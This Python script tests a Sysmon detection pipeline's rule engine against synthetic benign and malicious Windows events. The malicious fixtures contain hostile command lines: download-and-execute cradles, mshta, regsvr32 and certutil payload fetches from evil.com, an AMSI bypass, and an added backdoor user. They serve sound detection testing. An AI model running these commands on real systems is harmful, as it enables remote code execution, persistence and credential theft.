#!/usr/bin/env python3
"""Step 6 end-to-end pipeline verification: Normalizer (parse_event) -> RuleEngine.

Uses Sysmon XML shaped like Phase 0A samples (tests/fixtures/sysmon_samples/).
Models the activity run_pipeline.py observes during normal VM baseline runs
and the malicious-technique patterns from Section 9 true-positive tests.

Does NOT modify rules. Reports pass/fail per scenario.
"""

from __future__ import annotations

import sys
import xml.sax.saxutils as saxutils
from dataclasses import dataclass
from pathlib import Path
from typing import Any

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from normalizer.parser import parse_event  # noqa: E402
from rules.engine import RuleEngine  # noqa: E402
from rules.schema import RuleHit  # noqa: E402
from scripts.run_pipeline import _format_hit  # noqa: E402

SAMPLES_DIR = REPO_ROOT / "tests" / "fixtures" / "sysmon_samples"

NS = "http://schemas.microsoft.com/win/2004/08/events/event"
SYSTEM_BLOCK = (
    "<System>"
    "<Provider Name='Microsoft-Windows-Sysmon' "
    "Guid='{{5770385f-c22a-43e0-bf4c-06f5698ffbd9}}'/>"
    "<EventID>{event_id}</EventID>"
    "<Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode>"
    "<Keywords>0x8000000000000000</Keywords>"
    "<TimeCreated SystemTime='2026-06-23T10:00:00.0000000Z'/>"
    "<EventRecordID>999001</EventRecordID><Correlation/>"
    "<Execution ProcessID='1064' ThreadID='2584'/>"
    "<Channel>Microsoft-Windows-Sysmon/Operational</Channel>"
    "<Computer>DESKTOP-ANJEG7I</Computer>"
    "<Security UserID='S-1-5-18'/>"
    "</System>"
)


def _xml(event_id: int, data_pairs: list[tuple[str, str]]) -> str:
    data_elems = "".join(
        f"<Data Name='{name}'>{saxutils.escape(value)}</Data>"
        for name, value in data_pairs
    )
    return (
        f"<Event xmlns='{NS}'>"
        f"{SYSTEM_BLOCK.format(event_id=event_id)}"
        f"<EventData><Data Name='RuleName'>-</Data>"
        f"<Data Name='UtcTime'>2026-06-23 10:00:00.000</Data>"
        f"{data_elems}</EventData></Event>"
    )


def _proc(**kw: str) -> str:
    defaults = {
        "ProcessGuid": "{e2e-proc-guid}",
        "ProcessId": "5000",
        "Image": r"C:\Windows\System32\cmd.exe",
        "CommandLine": "cmd.exe",
        "CurrentDirectory": r"C:\\",
        "User": r"DESKTOP-ANJEG7I\user",
        "ParentProcessId": "4000",
        "ParentImage": r"C:\Windows\explorer.exe",
        "ParentCommandLine": "explorer.exe",
        "IntegrityLevel": "Medium",
    }
    defaults.update(kw)
    pairs = [(k, v) for k, v in defaults.items()]
    return _xml(1, pairs)


def _net(**kw: str) -> str:
    defaults = {
        "ProcessGuid": "{e2e-net-guid}",
        "ProcessId": "6000",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "User": r"DESKTOP-ANJEG7I\user",
        "Protocol": "tcp",
        "Initiated": "true",
        "SourceIp": "192.168.1.100",
        "SourcePort": "54000",
        "DestinationIp": "203.0.113.10",
        "DestinationHostname": "c2.example.com",
        "DestinationPort": "443",
    }
    defaults.update(kw)
    return _xml(3, [(k, v) for k, v in defaults.items()])


def _open_proc(**kw: str) -> str:
    defaults = {
        "SourceProcessId": "3000",
        "SourceImage": r"C:\Windows\System32\powershell.exe",
        "TargetProcessId": "900",
        "TargetImage": r"C:\Windows\System32\lsass.exe",
        "GrantedAccess": "0x1410",
    }
    defaults.update(kw)
    return _xml(10, [(k, v) for k, v in defaults.items()])


def _crt(**kw: str) -> str:
    defaults = {
        "SourceProcessId": "7000",
        "SourceImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "TargetProcessId": "8000",
        "TargetImage": r"C:\Windows\explorer.exe",
        "NewThreadId": "9000",
        "StartAddress": "0x7fff1234abcd",
    }
    defaults.update(kw)
    return _xml(8, [(k, v) for k, v in defaults.items()])


@dataclass(frozen=True)
class Scenario:
    name: str
    xml: str
    expect_hit: bool
    expected_rule_id: str | None = None
    expected_severity: str | None = None


EDGE = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
EXPLORER = r"C:\Windows\explorer.exe"
CSRSS = r"C:\Windows\System32\csrss.exe"
CONHOST = r"C:\Windows\System32\conhost.exe"
SVCHOST = r"C:\Windows\System32\svchost.exe"
MSMPENG = r"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.26050.15-0\MsMpEng.exe"
WINLOGON = r"C:\Windows\System32\winlogon.exe"
WININIT = r"C:\Windows\System32\wininit.exe"
LSASS = r"C:\Windows\System32\lsass.exe"
CMD = r"C:\Windows\System32\cmd.exe"
SERVICES = r"C:\Windows\System32\services.exe"
IDENTITY_HELPER = r"C:\Program Files (x86)\Microsoft\Edge\Application\identity_helper.exe"
ELEVATION_SERVICE = r"C:\Program Files (x86)\Microsoft\Edge\Application\elevation_service.exe"
APPFRAMEHOST = r"C:\Windows\System32\ApplicationFrameHost.exe"
RUNTIMEBROKER = r"C:\Windows\System32\RuntimeBroker.exe"
WINSTORE = r"C:\Program Files\WindowsApps\WinStore.App.exe"
MSMPENG_DEFENDER = r"C:\Program Files\Windows Defender\MsMpEng.exe"
WERFAULT = r"C:\Windows\System32\WerFault.exe"


def _load_sample(name: str) -> str:
    return (SAMPLES_DIR / name).read_text(encoding="utf-8")


def build_benign_scenarios() -> list[Scenario]:
    """Activity run_pipeline.py sees during normal VM baseline (opening Edge, idle PS, etc.)."""
    return [
        Scenario("Phase0A notepad launch (real sample)", _load_sample("sample_event_1_processcreate.xml"), False),
        Scenario("Phase0A svchost network (real sample)", _load_sample("sample_event_3_networkconnect.xml"), False),
        Scenario("Phase0A image load (real sample)", _load_sample("sample_event_7_imageload.xml"), False),
        Scenario("Phase0A Defender OpenProcess 0x1000 (real sample)", _load_sample("sample_event_10_openprocess.xml"), False),
        Scenario("Phase0A Chrome DNS query (real sample)", _load_sample("sample_event_22_dnsquery.xml"), False),
        Scenario("explorer launches msedge", _proc(
            Image=EDGE,
            CommandLine=f'"{EDGE}"',
            ParentImage=EXPLORER,
            ParentCommandLine="explorer.exe",
        ), False),
        Scenario("msedge sibling OpenProcess 0x1fffff", _open_proc(
            SourceImage=EDGE, TargetImage=EDGE, GrantedAccess="0x1fffff",
        ), False),
        Scenario("chrome sibling OpenProcess 0x1fffff", _open_proc(
            SourceImage=CHROME, TargetImage=CHROME, GrantedAccess="0x1fffff",
        ), False),
        Scenario("svchost sibling OpenProcess 0x1fffff", _open_proc(
            SourceImage=SVCHOST, TargetImage=SVCHOST, GrantedAccess="0x1fffff",
        ), False),
        Scenario("csrss session management OpenProcess", _open_proc(
            SourceImage=CSRSS, TargetImage=SVCHOST, GrantedAccess="0x1fffff",
        ), False),
        Scenario("conhost attaches to cmd OpenProcess", _open_proc(
            SourceImage=CONHOST, TargetImage=CMD, GrantedAccess="0x1fffff",
        ), False),
        Scenario("powershell opens own conhost", _open_proc(
            SourceImage=PS, TargetImage=CONHOST, GrantedAccess="0x1fffff",
        ), False),
        Scenario("winlogon opens lsass 0x1410 (auth path)", _open_proc(
            SourceImage=WINLOGON, TargetImage=LSASS, GrantedAccess="0x1410",
        ), False),
        Scenario("MsMpEng memory scan 0x1410", _open_proc(
            SourceImage=MSMPENG, TargetImage=PS, GrantedAccess="0x1410",
        ), False),
        Scenario("benign OpenProcess READ_CONTROL 0x40", _open_proc(GrantedAccess="0x40"), False),
        Scenario("benign OpenProcess SYNCHRONIZE 0x08", _open_proc(GrantedAccess="0x08"), False),
        Scenario("benign OpenProcess QUERY_LIMITED 0x1000", _open_proc(GrantedAccess="0x1000"), False),
        # live-VM-derived benign — observed on Win10 Pro sandbox
        Scenario("live-VM: explorer OpenProcess msedge 0x1fffff", _open_proc(
            SourceImage=EXPLORER, TargetImage=EDGE, GrantedAccess="0x1fffff",
        ), False),
        Scenario("live-VM: svchost OpenProcess msedge 0x1fffff", _open_proc(
            SourceImage=SVCHOST, TargetImage=EDGE, GrantedAccess="0x1fffff",
        ), False),
        Scenario("live-VM: services OpenProcess svchost 0x1fffff", _open_proc(
            SourceImage=SERVICES, TargetImage=SVCHOST, GrantedAccess="0x1fffff",
        ), False),
        Scenario("live-VM: msedge OpenProcess identity_helper 0x1fffff", _open_proc(
            SourceImage=EDGE, TargetImage=IDENTITY_HELPER, GrantedAccess="0x1fffff",
        ), False),
        Scenario("live-VM: explorer OpenProcess ApplicationFrameHost 0x1410", _open_proc(
            SourceImage=EXPLORER, TargetImage=APPFRAMEHOST, GrantedAccess="0x1410",
        ), False),
        Scenario("live-VM: services OpenProcess elevation_service 0x1fffff", _open_proc(
            SourceImage=SERVICES, TargetImage=ELEVATION_SERVICE, GrantedAccess="0x1fffff",
        ), False),
        Scenario("live-VM: svchost OpenProcess RuntimeBroker 0x1fffff", _open_proc(
            SourceImage=SVCHOST, TargetImage=RUNTIMEBROKER, GrantedAccess="0x1fffff",
        ), False),
        Scenario("live-VM: svchost OpenProcess WinStore.App 0x1fffff", _open_proc(
            SourceImage=SVCHOST, TargetImage=WINSTORE, GrantedAccess="0x1fffff",
        ), False),
        Scenario("live-VM: MsMpEng OpenProcess lsass 0x1fffff", _open_proc(
            SourceImage=MSMPENG_DEFENDER, TargetImage=LSASS, GrantedAccess="0x1fffff",
        ), False),
        Scenario("live-VM: wininit OpenProcess lsass 0x1fffff", _open_proc(
            SourceImage=WININIT, TargetImage=LSASS, GrantedAccess="0x1fffff",
        ), False),
        Scenario("chrome JIT same-image CreateRemoteThread", _crt(
            SourceImage=CHROME, TargetImage=CHROME,
        ), False),
        Scenario("msedge sandbox same-image CreateRemoteThread", _crt(
            SourceImage=EDGE, TargetImage=EDGE,
        ), False),
        Scenario("WerFault crash-report CreateRemoteThread", _crt(
            SourceImage=WERFAULT, TargetImage=EDGE,
        ), False),
        Scenario("csrss session CreateRemoteThread", _crt(
            SourceImage=CSRSS, TargetImage=SVCHOST,
        ), False),
        Scenario("normal PS Get-Process from explorer", _proc(
            Image=PS,
            CommandLine="powershell.exe Get-Process",
            ParentImage=EXPLORER,
        ), False),
        Scenario("normal PS Get-ChildItem from explorer", _proc(
            Image=PS,
            CommandLine='powershell.exe -Command "Get-ChildItem C:\\Users"',
            ParentImage=EXPLORER,
        ), False),
        Scenario("benign curl alias from explorer", _proc(
            Image=PS,
            CommandLine="powershell.exe -c curl https://packages.microsoft.com/update",
            ParentImage=EXPLORER,
        ), False),
        Scenario("benign wget alias from explorer", _proc(
            Image=PS,
            CommandLine="powershell.exe -c wget https://example.com/file.txt",
            ParentImage=EXPLORER,
        ), False),
        Scenario("benign iwr from explorer", _proc(
            Image=PS,
            CommandLine="powershell.exe -c iwr https://gallery.technet.microsoft.com/mod",
            ParentImage=EXPLORER,
        ), False),
        Scenario("Update-Help to update.microsoft.com", _net(
            DestinationHostname="update.microsoft.com",
            DestinationIp="13.107.4.50",
            DestinationPort="443",
        ), False),
        Scenario("Install-Module to PSGallery", _net(
            DestinationHostname="www.powershellgallery.com",
            DestinationIp="13.67.143.117",
            DestinationPort="443",
        ), False),
        Scenario("Windows Update hostname", _net(
            DestinationHostname="windowsupdate.microsoft.com",
            DestinationPort="443",
        ), False),
        Scenario("scheduled task hidden-window PS (taskeng)", _proc(
            Image=PS,
            CommandLine='powershell.exe -NonInteractive -WindowStyle Hidden -Command "& C:\\Scripts\\Backup.ps1"',
            ParentImage=r"C:\Windows\System32\taskeng.exe",
        ), False),
        Scenario("scheduled task hidden-window PS (svchost)", _proc(
            Image=PS,
            CommandLine='powershell.exe -W Hidden -File C:\\Scripts\\Cleanup.ps1',
            ParentImage=SVCHOST,
        ), False),
        Scenario("legitimate rundll32 printui", _proc(
            Image=r"C:\Windows\System32\rundll32.exe",
            CommandLine="rundll32.exe printui.dll,PrintUIEntry /install",
            ParentImage=EXPLORER,
        ), False),
        Scenario("legitimate certutil -dump", _proc(
            Image=r"C:\Windows\System32\certutil.exe",
            CommandLine="certutil.exe -dump certificate.cer",
            ParentImage=CMD,
        ), False),
        Scenario("legitimate regsvr32 local dll", _proc(
            Image=r"C:\Windows\System32\regsvr32.exe",
            CommandLine="regsvr32.exe /s C:\\Windows\\System32\\mylegit.dll",
            ParentImage=EXPLORER,
        ), False),
        Scenario("explorer spawns PS (no chain rule)", _proc(
            Image=PS,
            CommandLine="powershell.exe Get-Process",
            ParentImage=EXPLORER,
        ), False),
        Scenario("svchost spawns conhost at startup", _proc(
            Image=CONHOST,
            CommandLine="\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
            ParentImage=SVCHOST,
        ), False),
        Scenario("csrss spawns conhost", _proc(
            Image=CONHOST,
            CommandLine="\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff",
            ParentImage=CSRSS,
        ), False),
    ]


def build_malicious_scenarios() -> list[Scenario]:
    """One technique per rule — mirrors Section 9 true-positive tests."""
    return [
        Scenario(
            "PS encoded command (-EncodedCommand)",
            _proc(Image=PS, CommandLine="powershell.exe -EncodedCommand JABzAD0AJwBoAGUAbABsAGMAbwBkAGUAJwA=", ParentImage=CMD),
            True, "PS_ENCODED_CMD_001", "High",
        ),
        Scenario(
            "PS download cradle (IEX DownloadString from cmd)",
            _proc(
                Image=PS,
                CommandLine='powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/p\')"',
                ParentImage=CMD,
            ),
            True, "PS_DOWNLOAD_CRADLE_001", "High",
        ),
        Scenario(
            "PS AMSI bypass (AmsiUtils)",
            _proc(
                Image=PS,
                CommandLine="powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
                ParentImage=CMD,
            ),
            True, "PS_AMSI_BYPASS_001", "High",
        ),
        Scenario(
            "PS hidden window from cmd",
            _proc(
                Image=PS,
                CommandLine='powershell.exe -W Hidden -enc JABzAD0AJwBzAHQAYQBnAGUAMgAnAA==',
                ParentImage=CMD,
            ),
            True, "PS_HIDDEN_WINDOW_001", "Medium",
        ),
        Scenario(
            "CreateRemoteThread cross-image injection",
            _crt(),
            True, "API_CREATE_REMOTE_THREAD_001", "Critical",
        ),
        Scenario(
            "OpenProcess injection mask (implant->lsass 0x1f0fff)",
            _open_proc(
                SourceImage=r"C:\Users\User\AppData\Local\Temp\implant.exe",
                TargetImage=LSASS,
                GrantedAccess="0x1f0fff",
            ),
            True, "API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001", "High",
        ),
        Scenario(
            "OpenProcess python->lsass 0x1f0fff (credential access)",
            _open_proc(
                SourceImage=r"C:\python_runtime\python.exe",
                TargetImage=LSASS,
                GrantedAccess="0x1f0fff",
            ),
            True, "API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001", "High",
        ),
        Scenario(
            "OpenProcess cmd->lsass 0x1410 (injection mask)",
            _open_proc(
                SourceImage=CMD,
                TargetImage=LSASS,
                GrantedAccess="0x1410",
            ),
            True, "API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001", "High",
        ),
        Scenario(
            "PS outbound HTTP to suspicious host :443",
            _net(DestinationHostname="c2.attacker.net", DestinationPort="443"),
            True, "NET_POWERSHELL_HTTP_001", "High",
        ),
        Scenario(
            "mshta remote HTA execution",
            _proc(
                Image=r"C:\Windows\System32\mshta.exe",
                CommandLine="mshta.exe http://evil.com/payload.hta",
                ParentImage=CMD,
            ),
            True, "LOLBIN_MSHTA_001", "High",
        ),
        Scenario(
            "rundll32 javascript protocol",
            _proc(
                Image=r"C:\Windows\System32\rundll32.exe",
                CommandLine='rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";evil()',
                ParentImage=CMD,
            ),
            True, "LOLBIN_RUNDLL32_SUSPICIOUS_001", "High",
        ),
        Scenario(
            "regsvr32 Squiblydoo remote script",
            _proc(
                Image=r"C:\Windows\System32\regsvr32.exe",
                CommandLine="regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll",
                ParentImage=CMD,
            ),
            True, "LOLBIN_REGSVR32_001", "High",
        ),
        Scenario(
            "certutil urlcache download",
            _proc(
                Image=r"C:\Windows\System32\certutil.exe",
                CommandLine="certutil.exe -urlcache -f http://evil.com/payload.exe C:\\payload.exe",
                ParentImage=CMD,
            ),
            True, "LOLBIN_CERTUTIL_001", "Medium",
        ),
        Scenario(
            "Office macro chain -> PowerShell",
            _proc(
                ParentImage=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                Image=PS,
                CommandLine="powershell.exe -nop -w hidden -enc JABzAD0A",
            ),
            True, "CHAIN_OFFICE_POWERSHELL_001", "High",
        ),
        Scenario(
            "Office macro chain -> cmd",
            _proc(
                ParentImage=r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
                Image=CMD,
                CommandLine="cmd.exe /c whoami",
            ),
            True, "CHAIN_OFFICE_CMD_001", "High",
        ),
        Scenario(
            "wscript -> cmd chain",
            _proc(
                ParentImage=r"C:\Windows\System32\wscript.exe",
                Image=CMD,
                CommandLine="cmd.exe /c net user hacker P@ssw0rd /add",
            ),
            True, "CHAIN_SCRIPT_HOST_CMD_001", "High",
        ),
        Scenario(
            "cscript -> PowerShell chain",
            _proc(
                ParentImage=r"C:\Windows\System32\cscript.exe",
                Image=PS,
                CommandLine="powershell.exe -enc JABzAD0A",
            ),
            True, "CHAIN_SCRIPT_HOST_POWERSHELL_001", "High",
        ),
    ]


def run_stream(
    engine: RuleEngine,
    scenarios: list[Scenario],
    stream_name: str,
) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    print(f"\n{'=' * 72}")
    print(f"STREAM: {stream_name}  ({len(scenarios)} events)")
    print(f"{'=' * 72}")

    for sc in scenarios:
        event = parse_event(sc.xml)
        if event is None:
            rows.append({
                "scenario": sc.name,
                "expected": "hit" if sc.expect_hit else "no hit",
                "actual": "PARSE_FAIL",
                "pass": False,
            })
            print(f"  [PARSE_FAIL] {sc.name}")
            continue

        hits = engine.evaluate(event)
        hit_ids = [h.rule_id for h in hits]

        if sc.expect_hit:
            matching = [h for h in hits if h.rule_id == sc.expected_rule_id]
            if matching:
                hit = matching[0]
                sev_ok = hit.severity == sc.expected_severity
                passed = sev_ok
                actual = (
                    f"hit {hit.rule_id} severity={hit.severity} "
                    f"technique={hit.mitre_technique}"
                )
                if not sev_ok:
                    actual += f" (expected severity {sc.expected_severity})"
                print(f"  [HIT] {sc.name}")
                print(f"        {_format_hit(hit, event)}")
            else:
                passed = False
                actual = f"miss (got {hit_ids or 'no hits'})"
                print(f"  [MISS] {sc.name} — expected {sc.expected_rule_id}, got {hit_ids or 'none'}")
        else:
            passed = len(hits) == 0
            if hits:
                actual = ", ".join(h.rule_id for h in hits)
                print(f"  [FP] {sc.name} — unexpected: {actual}")
                for h in hits:
                    print(f"        {_format_hit(h, event)}")
            else:
                actual = "no hit"
                print(f"  [OK] {sc.name}")

        rows.append({
            "scenario": sc.name,
            "expected": "hit" if sc.expect_hit else "no hit",
            "actual": actual,
            "pass": passed,
        })

    return rows


def main() -> int:
    engine = RuleEngine(rules_dir=REPO_ROOT / "rules")
    engine.load()
    if engine.rule_count != 15:
        print(f"ERROR: expected 15 rules, got {engine.rule_count}")
        return 1

    benign_rows = run_stream(engine, build_benign_scenarios(), "BENIGN (run_pipeline baseline activity)")
    malicious_rows = run_stream(engine, build_malicious_scenarios(), "MALICIOUS-TECHNIQUE (15 rules)")

    all_rows = benign_rows + malicious_rows
    benign_pass = sum(1 for r in benign_rows if r["pass"])
    mal_pass = sum(1 for r in malicious_rows if r["pass"])

    print(f"\n{'=' * 72}")
    print("RESULTS TABLE")
    print(f"{'=' * 72}")
    print(f"{'Scenario':<52} {'Expected':<10} {'Actual':<28} {'Pass/Fail'}")
    print("-" * 110)
    for r in all_rows:
        actual_short = r["actual"][:26] + ".." if len(r["actual"]) > 28 else r["actual"]
        print(f"{r['scenario']:<52} {r['expected']:<10} {actual_short:<28} {'PASS' if r['pass'] else 'FAIL'}")

    print("-" * 110)
    print(f"Benign set:     {benign_pass}/{len(benign_rows)} pass  (target: zero false positives)")
    print(f"Malicious set:  {mal_pass}/{len(malicious_rows)} pass  (target: 15/15 rule hits)")
    print(f"Total:          {benign_pass + mal_pass}/{len(all_rows)} pass")
    overall = benign_pass == len(benign_rows) and mal_pass == len(malicious_rows)
    print(f"OVERALL:        {'PASS' if overall else 'FAIL'}")
    print()
    print("Note: Local synthetic pipeline only — NOT sandbox-validated against live VM Sysmon.")
    return 0 if overall else 1


if __name__ == "__main__":
    raise SystemExit(main())
